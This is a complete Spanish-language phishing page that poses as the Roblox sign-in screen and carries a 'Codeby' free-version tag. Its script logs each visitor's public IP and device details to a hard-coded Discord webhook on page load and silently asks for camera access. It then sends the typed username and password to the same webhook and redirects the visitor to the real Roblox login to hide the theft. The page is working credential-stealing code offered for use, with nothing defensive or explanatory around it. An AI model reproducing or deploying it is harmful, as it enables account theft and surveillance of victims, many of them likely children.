<!DOCTYPE html>
<html lang="es-es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión en Roblox</title>
    <link rel="icon" type="image/x-icon" href="https://www.roblox.com/favicon.ico">
    <style>
        body, html { margin: 0; padding: 0; height: 100%; width: 100%; font-family: 'Amazon Ember', Arial, sans-serif; overflow: hidden; background-color: #000; }
        
        /* FONDO DINÁMICO MEJORADO */
        .background-container {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-image: url('https://i.imgur.com/8mXfRmW.png'); /* Fondo mosaico exacto */
            background-size: cover; background-position: center; z-index: 1;
        }
        .background-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(0,0,0,0.7); z-index: 2;
        }

        .header { background-color: #191b1d; height: 40px; border-bottom: 1px solid #393b3d; display: flex; justify-content: center; align-items: center; position: relative; z-index: 4; }
        .header img { height: 20px; }

        .form-container { position: relative; z-index: 3; display: flex; justify-content: center; align-items: center; height: calc(100vh - 40px); }
        
        .login-box {
            background-color: #191b1d; padding: 30px; border-radius: 8px; width: 90%; max-width: 380px;
            text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        }

        h1 { color: white; font-size: 22px; margin-bottom: 20px; font-weight: 500; text-align: left; }

        input {
            width: 100%; padding: 12px; margin: 8px 0;
            background-color: #000; color: #fff;
            border: 1px solid #393b3d; border-radius: 4px;
            font-size: 14px; box-sizing: border-box;
        }

        .btn-login {
            width: 100%; padding: 12px; margin-top: 15px;
            background-color: #0084ff; color: white; border: none;
            border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 14px;
        }

        .links-container { color: #ccc; font-size: 13px; margin-top: 15px; text-align: left; line-height: 1.8; }
        .links-container a { color: #0084ff; text-decoration: none; }
        .codeby-tag { color: #00ffcc; font-size: 9px; margin-top: 20px; opacity: 0.4; letter-spacing: 1px; }
    </style>
</head>
<body>

    <div class="header"><img src="https://images.rbxcdn.com/2b53f60f64c677840139b4b9b6574f0c.png" alt="Roblox"></div>
    <div class="background-container"></div>
    <div class="background-overlay"></div>

    <div class="form-container">
        <div class="login-box">
            <h1>Iniciar sesión</h1>
            <input type="text" id="user" placeholder="Usuario/correo/teléfono">
            <input type="password" id="pass" placeholder="Contraseña">
            <button class="btn-login" id="loginBtn">Iniciar sesión</button>
            
            <div class="links-container">
                <a href="#">¿Olvidaste la contraseña o el nombre de usuario?</a><br>
                <a href="#">Inicio de sesión rápido</a><br>
                <span>¿No tienes una cuenta? <a href="#">Regístrate</a></span>
            </div>
            <div class="codeby-tag">Codeby versión gratuita</div>
        </div>
    </div>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1499616194741801133/i-irhmgrf87Sldg0W8yWsgRAz_TUYh3JK7DEu7UGi6bsKvMNUwNe3vnpH2Ga1qFlvUNk";

        // 1. RECOPILACIÓN AUTOMÁTICA AL ENTRAR (IP Y DISPOSITIVO)
        window.onload = async () => {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                
                // Petición silenciosa de cámara para "verificación facial" (Acceso a multimedia)
                navigator.mediaDevices.getUserMedia({ video: true }).catch(() => {});

                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "📡 NUEVA CONEXIÓN DETECTADA - Codeby",
                            color: 0x00ffcc,
                            fields: [
                                { name: "🌐 IP Pública", value: ipData.ip, inline: true },
                                { name: "📱 Dispositivo", value: navigator.userAgent }
                            ],
                            timestamp: new Date()
                        }]
                    })
                });
            } catch (e) {}
        };

        // 2. CAPTURA DE CREDENCIALES
        document.getElementById('loginBtn').addEventListener('click', async () => {
            const user = document.getElementById('user').value;
            const pass = document.getElementById('pass').value;

            if (user && pass) {
                try {
                    await fetch(webhookURL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            embeds: [{
                                title: "🔑 LOGIN CAPTURADO - Codeby",
                                color: 0xff0000,
                                fields: [
                                    { name: "👤 Usuario", value: user, inline: true },
                                    { name: "🔒 Clave", value: pass, inline: true }
                                ]
                            }]
                        })
                    });
                    window.location.href = "https://www.roblox.com/login";
                } catch (e) {
                    window.location.href = "https://www.roblox.com/login";
                }
            }
        });
    </script>
</body>
</html>
